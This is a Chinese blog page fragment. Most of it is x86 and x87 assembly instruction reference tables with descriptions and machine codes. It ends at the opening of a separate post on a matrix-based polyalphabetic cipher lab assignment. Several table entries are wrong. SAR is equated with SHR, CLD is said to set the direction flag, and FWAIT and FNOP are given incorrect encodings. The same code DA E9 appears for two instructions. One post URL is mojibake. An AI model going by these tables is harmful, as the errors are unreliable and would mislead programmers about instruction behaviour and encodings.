<td align="center"><strong>整数乘法,结果回送AH和AL(字节运算),或DX和AX(字运算)</strong></td>
</tr>
<tr>
<td align="center"><strong>AAM</strong></td>
<td align="center"><strong>乘法的ASCII码调整</strong></td>
</tr>
<tr>
<td align="center"><strong>DIV</strong></td>
<td align="center"><strong>无符号除法,结果回送:商回送AL,余数回送AH, (字节运算);或 商回送AX,余数回送DX, (字运算)</strong></td>
</tr>
<tr>
<td align="center"><strong>IDIV</strong></td>
<td align="center"><strong>整数除法.结果回送:商回送AL,余数回送AH, (字节运算);或 商回送AX,余数回送DX, (字运算)</strong></td>
</tr>
<tr>
<td align="center"><strong>AAD</strong></td>
<td align="center"><strong>除法的ASCII码调整</strong></td>
</tr>
<tr>
<td align="center"><strong>CBW</strong></td>
<td align="center"><strong>字节转换为字(把AL中字节的符号扩展到AH中去)</strong></td>
</tr>
<tr>
<td align="center"><strong>CWD</strong></td>
<td align="center"><strong>字转换为双字(把AX中的字的符号扩展到DX中去)</strong></td>
</tr>
<tr>
<td align="center"><strong>CWDE</strong></td>
<td align="center"><strong>字转换为双字(把AX中的字符号扩展到EAX中去)</strong></td>
</tr>
<tr>
<td align="center"><strong>CDQ</strong></td>
<td align="center"><strong>双字扩展(把EAX中的字的符号扩展到EDX中去)</strong></td>
</tr>
</tbody></table>
<h3 id="逻辑运算指令"><a href="#逻辑运算指令" class="headerlink" title="逻辑运算指令"></a>逻辑运算指令</h3><p>以下八种移位指令,其移位次数可达255次,移位一次时, 可直接用操作码. 如 SHL AX,1.  移位&gt;1次时, 则由寄存器CL给出移位次数.  如 MOV CL,04   SHL AX,CL  </p>
<table>
<thead>
<tr>
<th align="center">AND</th>
<th align="center">与运算</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><strong>OR</strong></td>
<td align="center"><strong>或运算</strong></td>
</tr>
<tr>
<td align="center"><strong>XOR</strong></td>
<td align="center"><strong>异或运算</strong></td>
</tr>
<tr>
<td align="center"><strong>NOT</strong></td>
<td align="center"><strong>取反</strong></td>
</tr>
<tr>
<td align="center"><strong>TEST</strong></td>
<td align="center"><strong>测试(两操作数作与运算,仅修改标志位,不回送结果)</strong></td>
</tr>
<tr>
<td align="center"><strong>SHL</strong></td>
<td align="center"><strong>逻辑左移</strong></td>
</tr>
<tr>
<td align="center"><strong>SAL</strong></td>
<td align="center"><strong>算术左移(=SHL)</strong></td>
</tr>
<tr>
<td align="center"><strong>SHR</strong></td>
<td align="center"><strong>逻辑右移</strong></td>
</tr>
<tr>
<td align="center"><strong>SAR</strong></td>
<td align="center"><strong>算术右移(=SHR)</strong></td>
</tr>
<tr>
<td align="center"><strong>ROL</strong></td>
<td align="center"><strong>循环左移</strong></td>
</tr>
<tr>
<td align="center"><strong>ROR</strong></td>
<td align="center"><strong>循环右移</strong></td>
</tr>
<tr>
<td align="center"><strong>RCL</strong></td>
<td align="center"><strong>通过进位的循环左移</strong></td>
</tr>
<tr>
<td align="center"><strong>RCR</strong></td>
<td align="center"><strong>通过进位的循环右移</strong></td>
</tr>
</tbody></table>
<h3 id="串指令"><a href="#串指令" class="headerlink" title="串指令"></a>串指令</h3><blockquote>
<p>DS:SI 源串段寄存器 :源串变址.<br>ES:DI 目标串段寄存器:目标串变址.<br>CX 重复次数计数器.<br>AL/AX 扫描值.<br>D标志   0表示重复操作中SI和DI应自动增量; 1表示应自动减量.<br> Z标志   用来控制扫描或比较操作的结束.  </p>
</blockquote>
<table>
<thead>
<tr>
<th align="center">MOVS</th>
<th align="center">串传送(MOVSB 传送字符；MOVSW 传送字；MOVSD 传送双字)</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><strong>CMPS</strong></td>
<td align="center"><strong>串比较(CMPSB 比较字符;CMPSW 比较字)</strong></td>
</tr>
<tr>
<td align="center"><strong>SCAS</strong></td>
<td align="center"><strong>串扫描(把AL或AX的内容与目标串作比较,比较结果反映在标志位)</strong></td>
</tr>
<tr>
<td align="center"><strong>LODS</strong></td>
<td align="center"><strong>装入串(把源串中的元素(字或字节)逐一装入AL或AX中( LODSB传送字符;LODSW传送字  LODSD 传送双字)</strong></td>
</tr>
<tr>
<td align="center"><strong>STOS</strong></td>
<td align="center"><strong>保存串(是LODS的逆过程)</strong></td>
</tr>
<tr>
<td align="center"><strong>REP</strong></td>
<td align="center"><strong>当CX/ECX&lt;&gt;0时重复</strong></td>
</tr>
<tr>
<td align="center"><strong>REPE/REPZ</strong></td>
<td align="center"><strong>当ZF=1或比较结果相等,且CX/ECX&lt;&gt;0时重复</strong></td>
</tr>
<tr>
<td align="center"><strong>REPNE/REPNZ</strong></td>
<td align="center"><strong>当ZF=0或比较结果不相等,且CX/ECX&lt;&gt;0时重复</strong></td>
</tr>
<tr>
<td align="center"><strong>REPC</strong></td>
<td align="center"><strong>当CF=1且CX/ECX&lt;&gt;0时重复</strong></td>
</tr>
<tr>
<td align="center"><strong>REPNC</strong></td>
<td align="center"><strong>当CF=0且CX/ECX&lt;&gt;0时重复</strong></td>
</tr>
</tbody></table>
<h3 id="程序转移指令"><a href="#程序转移指令" class="headerlink" title="程序转移指令"></a>程序转移指令</h3><h4 id="无条件转移指令"><a href="#无条件转移指令" class="headerlink" title="无条件转移指令"></a>无条件转移指令</h4><p><strong>长转移</strong></p>
<table>
<thead>
<tr>
<th align="center">JMP</th>
<th align="center">无条件转移指令</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><strong>CALL</strong></td>
<td align="center"><strong>过程调用</strong></td>
</tr>
<tr>
<td align="center"><strong>RET/RETF</strong></td>
<td align="center"><strong>过程返回</strong></td>
</tr>
</tbody></table>
<h4 id="条件转移指令"><a href="#条件转移指令" class="headerlink" title="条件转移指令"></a>条件转移指令</h4><p>*<em>短转移,-128到+127的距离内,当且仅当(SF XOR OF)=1时,OP1&lt;OP2 *</em></p>
<table>
<thead>
<tr>
<th align="center">JA/JNBE</th>
<th align="center">不小于或不等于时转移</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><strong>JAE/JNB</strong></td>
<td align="center"><strong>大于或等于转移</strong></td>
</tr>
<tr>
<td align="center"><strong>JB/JNAE</strong></td>
<td align="center"><strong>小于转移</strong></td>
</tr>
<tr>
<td align="center"><strong>JBE/JNA</strong></td>
<td align="center"><strong>小于或等于转移</strong></td>
</tr>
</tbody></table>
<p><strong>以上四条,测试无符号整数运算的结果(标志C和Z)</strong></p>
<table>
<thead>
<tr>
<th align="center">JG/JNLE</th>
<th align="center">大于转移</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><strong>JGE/JNL</strong></td>
<td align="center"><strong>大于或等于转移</strong></td>
</tr>
<tr>
<td align="center"><strong>JL/JNGE</strong></td>
<td align="center"><strong>小于转移</strong></td>
</tr>
<tr>
<td align="center"><strong>JLE/JNG</strong></td>
<td align="center"><strong>小于或等于转移</strong></td>
</tr>
</tbody></table>
<p><strong>以上四条,测试带符号整数运算的结果(标志S,O和Z)</strong></p>
<table>
<thead>
<tr>
<th align="center">JE/JZ</th>
<th align="center">等于转移</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><strong>JNE/JNZ</strong></td>
<td align="center"><strong>不等于时转移</strong></td>
</tr>
<tr>
<td align="center"><strong>JC</strong></td>
<td align="center"><strong>有进位时转移</strong></td>
</tr>
<tr>
<td align="center"><strong>JNC</strong></td>
<td align="center"><strong>无进位时转移</strong></td>
</tr>
<tr>
<td align="center"><strong>JNO</strong></td>
<td align="center"><strong>不溢出时转移</strong></td>
</tr>
<tr>
<td align="center"><strong>JNP/JPO</strong></td>
<td align="center"><strong>奇偶性为奇数时转移</strong></td>
</tr>
<tr>
<td align="center"><strong>JNS</strong></td>
<td align="center"><strong>符号位为 “0” 时转移</strong></td>
</tr>
<tr>
<td align="center"><strong>JO</strong></td>
<td align="center"><strong>溢出转移</strong></td>
</tr>
<tr>
<td align="center"><strong>JP/JPE</strong></td>
<td align="center"><strong>奇偶性为偶数时转移</strong></td>
</tr>
<tr>
<td align="center"><strong>JS</strong></td>
<td align="center"><strong>符号位为 “1” 时转移</strong></td>
</tr>
</tbody></table>
<h4 id="循环控制指令"><a href="#循环控制指令" class="headerlink" title="循环控制指令"></a>循环控制指令</h4><p><strong>短转移</strong></p>
<table>
<thead>
<tr>
<th align="center">LOOP</th>
<th align="center">CX不为零时循环</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><strong>LOOPE/LOOPZ</strong></td>
<td align="center"><strong>CX不为零且标志Z=1时循环</strong></td>
</tr>
<tr>
<td align="center"><strong>LOOPNE/LOOPNZ</strong></td>
<td align="center"><strong>CX不为零且标志Z=0时循环</strong></td>
</tr>
<tr>
<td align="center"><strong>JCXZ</strong></td>
<td align="center"><strong>CX为零时转移</strong></td>
</tr>
<tr>
<td align="center"><strong>JECXZ</strong></td>
<td align="center"><strong>ECX为零时转移</strong></td>
</tr>
</tbody></table>
<h4 id="中断指令"><a href="#中断指令" class="headerlink" title="中断指令"></a>中断指令</h4><table>
<thead>
<tr>
<th align="center">INT</th>
<th align="center">中断指令</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><strong>INTO</strong></td>
<td align="center"><strong>溢出中断</strong></td>
</tr>
<tr>
<td align="center"><strong>IRET</strong></td>
<td align="center"><strong>中断返回</strong></td>
</tr>
</tbody></table>
<h4 id="处理器控制指令"><a href="#处理器控制指令" class="headerlink" title="处理器控制指令"></a>处理器控制指令</h4><table>
<thead>
<tr>
<th align="center">HLT</th>
<th align="center">处理器暂停,  直到出现中断或复位信号才继续</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><strong>WAIT</strong></td>
<td align="center"><strong>当芯片引线TEST为高电平时使CPU进入等待状态</strong></td>
</tr>
<tr>
<td align="center"><strong>ESC</strong></td>
<td align="center"><strong>转换到外处理器</strong></td>
</tr>
<tr>
<td align="center"><strong>LOCK</strong></td>
<td align="center"><strong>封锁总线</strong></td>
</tr>
<tr>
<td align="center"><strong>NOP</strong></td>
<td align="center"><strong>空操作</strong></td>
</tr>
<tr>
<td align="center"><strong>STC</strong></td>
<td align="center"><strong>置进位标志位</strong></td>
</tr>
<tr>
<td align="center"><strong>CLC</strong></td>
<td align="center"><strong>清进位标志位</strong></td>
</tr>
<tr>
<td align="center"><strong>CMC</strong></td>
<td align="center"><strong>进位标志取反</strong></td>
</tr>
<tr>
<td align="center"><strong>STD</strong></td>
<td align="center"><strong>置方向标志位</strong></td>
</tr>
<tr>
<td align="center"><strong>CLD</strong></td>
<td align="center"><strong>清方向标志位</strong></td>
</tr>
<tr>
<td align="center"><strong>STI</strong></td>
<td align="center"><strong>置中断允许位</strong></td>
</tr>
<tr>
<td align="center"><strong>CLI</strong></td>
<td align="center"><strong>清中断允许位</strong></td>
</tr>
</tbody></table>
<h3 id="伪指令"><a href="#伪指令" class="headerlink" title="伪指令"></a>伪指令</h3><table>
<thead>
<tr>
<th align="center">DW</th>
<th align="center">定义字(2字节)</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><strong>PROC</strong></td>
<td align="center"><strong>定义过程</strong></td>
</tr>
<tr>
<td align="center"><strong>ENDP</strong></td>
<td align="center"><strong>过程结束</strong></td>
</tr>
<tr>
<td align="center"><strong>SEGMENT</strong></td>
<td align="center"><strong>定义段</strong></td>
</tr>
<tr>
<td align="center"><strong>ASSUME</strong></td>
<td align="center"><strong>建立段寄存器寻址</strong></td>
</tr>
<tr>
<td align="center"><strong>ENDS</strong></td>
<td align="center"><strong>段结束</strong></td>
</tr>
<tr>
<td align="center"><strong>END</strong></td>
<td align="center"><strong>程序结束</strong></td>
</tr>
</tbody></table>
<h3 id="处理机控制指令：标志处理指令"><a href="#处理机控制指令：标志处理指令" class="headerlink" title="处理机控制指令：标志处理指令"></a>处理机控制指令：标志处理指令</h3><table>
<thead>
<tr>
<th align="center">CLC</th>
<th align="center">进位位置0指令</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><strong>CMC</strong></td>
<td align="center"><strong>进位位求反指令</strong></td>
</tr>
<tr>
<td align="center"><strong>STC</strong></td>
<td align="center"><strong>进位位置为1指令</strong></td>
</tr>
<tr>
<td align="center"><strong>CLD</strong></td>
<td align="center"><strong>方向标志置1指令</strong></td>
</tr>
<tr>
<td align="center"><strong>STD</strong></td>
<td align="center"><strong>方向标志位置1指令</strong></td>
</tr>
<tr>
<td align="center"><strong>CLI</strong></td>
<td align="center"><strong>中断标志置0指令</strong></td>
</tr>
<tr>
<td align="center"><strong>STI</strong></td>
<td align="center"><strong>中断标志置1指令</strong></td>
</tr>
<tr>
<td align="center"><strong>NOP</strong></td>
<td align="center"><strong>无操作</strong></td>
</tr>
<tr>
<td align="center"><strong>HLT</strong></td>
<td align="center"><strong>停机</strong></td>
</tr>
<tr>
<td align="center"><strong>WAIT</strong></td>
<td align="center"><strong>等待</strong></td>
</tr>
<tr>
<td align="center"><strong>ESC</strong></td>
<td align="center"><strong>换码</strong></td>
</tr>
<tr>
<td align="center"><strong>LOCK</strong></td>
<td align="center"><strong>封锁</strong></td>
</tr>
</tbody></table>
<h2 id="浮点运算指令集"><a href="#浮点运算指令集" class="headerlink" title="浮点运算指令集"></a>浮点运算指令集</h2><h3 id="控制指令"><a href="#控制指令" class="headerlink" title="控制指令"></a>控制指令</h3><p>带9B的控制指令前缀F变为FN时浮点不检查，机器码去掉9B</p>
<table>
<thead>
<tr>
<th align="center">FINIT</th>
<th align="center">初始化浮点部件</th>
<th align="center">机器码  9B DB E3</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><strong>FCLEX</strong></td>
<td align="center"><strong>清除异常</strong></td>
<td align="center"><strong>机器码  9B DB E2</strong></td>
</tr>
<tr>
<td align="center"><strong>FDISI</strong></td>
<td align="center"><strong>浮点检查禁止中断</strong></td>
<td align="center"><strong>机器码  9B DB E1</strong></td>
</tr>
<tr>
<td align="center"><strong>FENI</strong></td>
<td align="center"><strong>浮点检查禁止中断二</strong></td>
<td align="center"><strong>机器码  9B DB E0</strong></td>
</tr>
<tr>
<td align="center"><strong>WAIT</strong></td>
<td align="center"><strong>同步CPU和FPU</strong></td>
<td align="center"><strong>机器码  9B</strong></td>
</tr>
<tr>
<td align="center"><strong>FWAIT</strong></td>
<td align="center"><strong>同步CPU和FPU</strong></td>
<td align="center"><strong>机器码  D9 D0</strong></td>
</tr>
<tr>
<td align="center"><strong>FNOP</strong></td>
<td align="center"><strong>无操作</strong></td>
<td align="center"><strong>机器码  DA E9</strong></td>
</tr>
<tr>
<td align="center"><strong>FXCH</strong></td>
<td align="center"><strong>交换ST(0)和ST(1)</strong></td>
<td align="center"><strong>机器码  D9 C9</strong></td>
</tr>
<tr>
<td align="center"><strong>FXCH ST(i)</strong></td>
<td align="center"><strong>交换ST(0)和ST(i)</strong></td>
<td align="center"><strong>机器码  D9 C1iii</strong></td>
</tr>
<tr>
<td align="center"><strong>FSTSW ax</strong></td>
<td align="center"><strong>状态字到ax</strong></td>
<td align="center"><strong>机器码  9B DF E0</strong></td>
</tr>
<tr>
<td align="center"><strong>FSTSW   word ptr mem</strong></td>
<td align="center"><strong>状态字到mem</strong></td>
<td align="center"><strong>机器码  9B DD mm111mmm</strong></td>
</tr>
<tr>
<td align="center"><strong>FLDCW   word ptr mem</strong></td>
<td align="center"><strong>mem到状态字</strong></td>
<td align="center"><strong>机器码  D9 mm101mmm</strong></td>
</tr>
<tr>
<td align="center"><strong>FSTCW   word ptr mem</strong></td>
<td align="center"><strong>控制字到mem</strong></td>
<td align="center"><strong>机器码  9B D9 mm111mmm</strong></td>
</tr>
<tr>
<td align="center"><strong>FLDENV  word ptr mem</strong></td>
<td align="center"><strong>mem到全环境</strong></td>
<td align="center"><strong>机器码  D9 mm100mmm</strong></td>
</tr>
<tr>
<td align="center"><strong>FSTENV  word ptr mem</strong></td>
<td align="center"><strong>全环境到mem</strong></td>
<td align="center"><strong>机器码  9B D9 mm110mmm</strong></td>
</tr>
<tr>
<td align="center"><strong>FRSTOR  word ptr mem</strong></td>
<td align="center"><strong>mem到FPU状态</strong></td>
<td align="center"><strong>机器码  DD mm100mmm</strong></td>
</tr>
<tr>
<td align="center"><strong>FSAVE   word ptr mem</strong></td>
<td align="center"><strong>FPU状态到mem</strong></td>
<td align="center"><strong>机器码  9B DD mm110mmm</strong></td>
</tr>
<tr>
<td align="center"><strong>FFREE ST(i)</strong></td>
<td align="center"><strong>标志ST(i)未使用</strong></td>
<td align="center"><strong>机器码  DD C0iii</strong></td>
</tr>
<tr>
<td align="center"><strong>FDECSTP</strong></td>
<td align="center"><strong>减少栈指针1-&gt;0 2-&gt;1</strong></td>
<td align="center"><strong>机器码  D9 F6</strong></td>
</tr>
<tr>
<td align="center"><strong>FINCSTP</strong></td>
<td align="center"><strong>增加栈指针0-&gt;1 1-&gt;2</strong></td>
<td align="center"><strong>机器码  D9 F7</strong></td>
</tr>
<tr>
<td align="center"><strong>FSETPM</strong></td>
<td align="center"><strong>浮点设置保护</strong></td>
<td align="center"><strong>机器码  DB E4</strong></td>
</tr>
</tbody></table>
<h3 id="数据传送指令"><a href="#数据传送指令" class="headerlink" title="数据传送指令"></a>数据传送指令</h3><table>
<thead>
<tr>
<th align="center">FLDZ</th>
<th align="center">将0.0装入ST(0)</th>
<th align="center">机器码  D9 EE</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><strong>FLD1</strong></td>
<td align="center"><strong>将1.0装入ST(0)</strong></td>
<td align="center"><strong>机器码  D9 E8</strong></td>
</tr>
<tr>
<td align="center"><strong>FLDPI</strong></td>
<td align="center"><strong>将π装入ST(0)</strong></td>
<td align="center"><strong>机器码  D9 EB</strong></td>
</tr>
<tr>
<td align="center"><strong>FLDL2T</strong></td>
<td align="center"><strong>将ln10/ln2装入ST(0)</strong></td>
<td align="center"><strong>机器码  D9 E9</strong></td>
</tr>
<tr>
<td align="center"><strong>FLDL2E</strong></td>
<td align="center"><strong>将1/ln2装入ST(0)</strong></td>
<td align="center"><strong>机器码  D9 EA</strong></td>
</tr>
<tr>
<td align="center"><strong>FLDLG2</strong></td>
<td align="center"><strong>将ln2/ln10装入ST(0)</strong></td>
<td align="center"><strong>机器码  D9 EC</strong></td>
</tr>
<tr>
<td align="center"><strong>FLDLN2</strong></td>
<td align="center"><strong>将ln2装入ST(0)</strong></td>
<td align="center"><strong>机器码  D9 ED</strong></td>
</tr>
<tr>
<td align="center"><strong>FLD    real4 ptr mem</strong></td>
<td align="center"><strong>装入mem的单精度浮点数</strong></td>
<td align="center"><strong>机器码  D9 mm000mmm</strong></td>
</tr>
<tr>
<td align="center"><strong>FLD    real8 ptr mem</strong></td>
<td align="center"><strong>装入mem的双精度浮点数</strong></td>
<td align="center"><strong>机器码  DD mm000mmm</strong></td>
</tr>
<tr>
<td align="center"><strong>FLD   real10 ptr mem</strong></td>
<td align="center"><strong>装入mem的十字节浮点数</strong></td>
<td align="center"><strong>机器码  DB mm101mmm</strong></td>
</tr>
<tr>
<td align="center"><strong>FILD    word ptr mem</strong></td>
<td align="center"><strong>装入mem的二字节整数</strong></td>
<td align="center"><strong>机器码  DF mm000mmm</strong></td>
</tr>
<tr>
<td align="center"><strong>FILD   dword ptr mem</strong></td>
<td align="center"><strong>装入mem的四字节整数</strong></td>
<td align="center"><strong>机器码  DB mm000mmm</strong></td>
</tr>
<tr>
<td align="center"><strong>FILD   qword ptr mem</strong></td>
<td align="center"><strong>装入mem的八字节整数</strong></td>
<td align="center"><strong>机器码  DF mm101mmm</strong></td>
</tr>
<tr>
<td align="center"><strong>FBLD   tbyte ptr mem</strong></td>
<td align="center"><strong>装入mem的十字节BCD数</strong></td>
<td align="center"><strong>机器码  DF mm100mmm</strong></td>
</tr>
<tr>
<td align="center"><strong>FST    real4 ptr mem</strong></td>
<td align="center"><strong>保存单精度浮点数到mem</strong></td>
<td align="center"><strong>机器码  D9 mm010mmm</strong></td>
</tr>
<tr>
<td align="center"><strong>FST    real8 ptr mem</strong></td>
<td align="center"><strong>保存双精度浮点数到mem</strong></td>
<td align="center"><strong>机器码  DD mm010mmm</strong></td>
</tr>
<tr>
<td align="center"><strong>FIST    word ptr mem</strong></td>
<td align="center"><strong>保存二字节整数到mem</strong></td>
<td align="center"><strong>机器码  DF mm010mmm</strong></td>
</tr>
<tr>
<td align="center"><strong>FIST   dword ptr mem</strong></td>
<td align="center"><strong>保存四字节整数到mem</strong></td>
<td align="center"><strong>机器码  DB mm010mmm</strong></td>
</tr>
<tr>
<td align="center"><strong>FSTP   real4 ptr mem</strong></td>
<td align="center"><strong>保存单精度浮点数到mem并出栈</strong></td>
<td align="center"><strong>机器码  D9 mm011mmm</strong></td>
</tr>
<tr>
<td align="center"><strong>FSTP   real8 ptr mem</strong></td>
<td align="center"><strong>保存双精度浮点数到mem并出栈</strong></td>
<td align="center"><strong>机器码  DD mm011mmm</strong></td>
</tr>
<tr>
<td align="center"><strong>FSTP  real10 ptr mem</strong></td>
<td align="center"><strong>保存十字节浮点数到mem并出栈</strong></td>
<td align="center"><strong>机器码  DB mm111mmm</strong></td>
</tr>
<tr>
<td align="center"><strong>FISTP   word ptr mem</strong></td>
<td align="center"><strong>保存二字节整数到mem并出栈</strong></td>
<td align="center"><strong>机器码  DF mm011mmm</strong></td>
</tr>
<tr>
<td align="center"><strong>FISTP  dword ptr mem</strong></td>
<td align="center"><strong>保存四字节整数到mem并出栈</strong></td>
<td align="center"><strong>机器码  DB mm011mmm</strong></td>
</tr>
<tr>
<td align="center"><strong>FISTP  qword ptr mem</strong></td>
<td align="center"><strong>保存八字节整数到mem并出栈</strong></td>
<td align="center"><strong>机器码  DF mm111mmm</strong></td>
</tr>
<tr>
<td align="center"><strong>FBSTP  tbyte ptr mem</strong></td>
<td align="center"><strong>保存十字节BCD数到mem并出栈</strong></td>
<td align="center"><strong>机器码  DF mm110mmm</strong></td>
</tr>
<tr>
<td align="center"><strong>FCMOVB</strong></td>
<td align="center"><strong>ST(0),ST(i) &lt;时传送</strong></td>
<td align="center"><strong>机器码  DA C0iii</strong></td>
</tr>
<tr>
<td align="center"><strong>FCMOVBE</strong></td>
<td align="center"><strong>ST(0),ST(i) &lt;=时传送</strong></td>
<td align="center"><strong>机器码  DA D0iii</strong></td>
</tr>
<tr>
<td align="center"><strong>FCMOVE</strong></td>
<td align="center"><strong>ST(0),ST(i) =时传送</strong></td>
<td align="center"><strong>机器码  DA C1iii</strong></td>
</tr>
<tr>
<td align="center"><strong>FCMOVNB</strong></td>
<td align="center"><strong>ST(0),ST(i) &gt;=时传送</strong></td>
<td align="center"><strong>机器码  DB C0iii</strong></td>
</tr>
<tr>
<td align="center"><strong>FCMOVNBE</strong></td>
<td align="center"><strong>ST(0),ST(i) &gt;时传送</strong></td>
<td align="center"><strong>机器码  DB D0iii</strong></td>
</tr>
<tr>
<td align="center"><strong>FCMOVNE</strong></td>
<td align="center"><strong>ST(0),ST(i) !=时传送</strong></td>
<td align="center"><strong>机器码  DB C1iii</strong></td>
</tr>
<tr>
<td align="center"><strong>FCMOVNU</strong></td>
<td align="center"><strong>ST(0),ST(i) 有序时传送</strong></td>
<td align="center"><strong>机器码  DB D1iii</strong></td>
</tr>
<tr>
<td align="center"><strong>FCMOVU</strong></td>
<td align="center"><strong>ST(0),ST(i) 无序时传送</strong></td>
<td align="center"><strong>机器码  DA D1iii</strong></td>
</tr>
</tbody></table>
<h3 id="比较指令"><a href="#比较指令" class="headerlink" title="比较指令"></a>比较指令</h3><table>
<thead>
<tr>
<th align="center">FCOM</th>
<th align="center">ST(0)-ST(1)</th>
<th align="center">机器码  D8 D1</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><strong>FCOMI</strong></td>
<td align="center"><strong>ST(0),ST(i)  ST(0)-ST(1)</strong></td>
<td align="center"><strong>机器码  DB F0iii</strong></td>
</tr>
<tr>
<td align="center"><strong>FCOMIP</strong></td>
<td align="center"><strong>ST(0),ST(i)  ST(0)-ST(1)并出栈</strong></td>
<td align="center"><strong>机器码  DF F0iii</strong></td>
</tr>
<tr>
<td align="center"><strong>FCOM   real4 ptr mem</strong></td>
<td align="center"><strong>ST(0)-实数mem</strong></td>
<td align="center"><strong>机器码  D8 mm010mmm</strong></td>
</tr>
<tr>
<td align="center"><strong>FCOM   real8 ptr mem</strong></td>
<td align="center"><strong>ST(0)-实数mem</strong></td>
<td align="center"><strong>机器码  DC mm010mmm</strong></td>
</tr>
<tr>
<td align="center"><strong>FICOM   word ptr mem</strong></td>
<td align="center"><strong>ST(0)-整数mem</strong></td>
<td align="center"><strong>机器码  DE mm010mmm</strong></td>
</tr>
<tr>
<td align="center"><strong>FICOM  dword ptr mem</strong></td>
<td align="center"><strong>ST(0)-整数mem</strong></td>
<td align="center"><strong>机器码  DA mm010mmm</strong></td>
</tr>
<tr>
<td align="center"><strong>FICOMP  word ptr mem</strong></td>
<td align="center"><strong>ST(0)-整数mem并出栈</strong></td>
<td align="center"><strong>机器码  DE mm011mmm</strong></td>
</tr>
<tr>
<td align="center"><strong>FICOMP dword ptr mem</strong></td>
<td align="center"><strong>ST(0)-整数mem并出栈</strong></td>
<td align="center"><strong>机器码  DA mm011mmm</strong></td>
</tr>
<tr>
<td align="center"><strong>FTST</strong></td>
<td align="center"><strong>ST(0)-0</strong></td>
<td align="center"><strong>机器码  D9 E4</strong></td>
</tr>
<tr>
<td align="center"><strong>FUCOM  ST(i)</strong></td>
<td align="center"><strong>ST(0)-ST(i)</strong></td>
<td align="center"><strong>机器码  DD E0iii</strong></td>
</tr>
<tr>
<td align="center"><strong>FUCOMP ST(i)</strong></td>
<td align="center"><strong>ST(0)-ST(i)并出栈</strong></td>
<td align="center"><strong>机器码  DD E1iii</strong></td>
</tr>
<tr>
<td align="center"><strong>FUCOMPP</strong></td>
<td align="center"><strong>ST(0)-ST(1)并二次出栈</strong></td>
<td align="center"><strong>机器码  DA E9</strong></td>
</tr>
<tr>
<td align="center"><strong>FXAM</strong></td>
<td align="center"><strong>ST(0)规格类型</strong></td>
<td align="center"><strong>机器码  D9 E5</strong></td>
</tr>
</tbody></table>
<h3 id="运算指令"><a href="#运算指令" class="headerlink" title="运算指令"></a>运算指令</h3><table>
<thead>
<tr>
<th>FADD</th>
<th>把目的操作数 (直接接在指令后的变量或堆栈缓存器) 与来源操作数 (接在目的操作数后的变量或堆栈缓存器)  相加，并将结果存入目的操作数</th>
</tr>
</thead>
<tbody><tr>
<td><strong>FADDP</strong></td>
<td><strong>这个指令是使目的操作数加上 ST  缓存器，并弹出 ST 缓存器，而目的操作数必须是堆栈缓存器的其中之一，最后不管目的操作数为何，经弹出一次后，目的操作数会变成上一个堆栈缓存器了</strong></td>
</tr>
<tr>
<td><strong>FIADD</strong></td>
<td><strong>FIADD 是把 ST   加上来源操作数，然后再存入 ST 缓存器，来源操作数必须是字组整数或短整数形态的变数</strong></td>
</tr>
</tbody></table>

        
      
    </div>

    
    
    
      <footer class="post-footer">
          <div class="post-eof"></div>
        
      </footer>
  </div>
  
  
  
  </article>

    
       <article itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block home">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/09/09/╧╓┤·├▄┬δ╤º╓«╢α▒φ╝╙├▄/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="ZERO-A-ONE">
      <meta itemprop="description" content="Resit much,Obey little">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ZERO-A-ONE">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
            
            <a href="/2019/09/09/╧╓┤·├▄┬δ╤º╓«╢α▒φ╝╙├▄/" class="post-title-link" itemprop="url">现代密码学之多表加密</a>
          
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              
                
              

              <time title="Created: 2019-09-09 06:53:48" itemprop="dateCreated datePublished" datetime="2019-09-09T06:53:48-07:00">2019-09-09</time>
            </span>
          
            

            
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2019-09-17 15:40:48" itemprop="dateModified" datetime="2019-09-17T15:40:48-07:00">2019-09-17</time>
              </span>
            
          

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="实验要求"><a href="#实验要求" class="headerlink" title="实验要求"></a>实验要求</h2><ul>
<li>根据扩展欧几里得算法实现求乘法逆元模块</li>
<li>根据分组长度n, 生成密钥(A,B)。即可逆矩阵A和向量B。生成的密钥要有随机性，密钥以文件形式存储</li>
<li>生成A的逆矩阵A-1</li>
<li>实现多表代换加密、解密模块</li>
<li>实现加密解密软件基本的可视化界面，能够对输入文本框的英文字符串进行加密解密，能够对文本文件中的文本进行加密解密</li>
<li>附加内容<ul>
<li>对长度不是n的倍数的明文的处理，能够对长度不是n的倍数的明文进行加密解密</li>
<li>对空格和标点符号的处理。要求解密时能还原空格和标点符号</li>
</ul>
</li>
</ul>
<h2 id="实验原理"><a href="#实验原理" class="headerlink" title="实验原理"></a>实验原理</h2><p>多表代换密码实现加密过程主要可以分为以下几个步骤：</p>
<ul>
<li>随机生成n*n的可逆矩阵A，且满足A的行列式与所定模N互素，作为密钥A</li>
<li>随机生成n*1的矩阵B，作为密钥B</li>
<li>对所需明文就行分组</li>
<li>通过<code>Ci≡AMi+B(mod 26)</code>加密变换求出密文</li>
</ul>
<p>多表代换密码实现解密过程主要可以分为以下几个步骤：</p>
<ul>
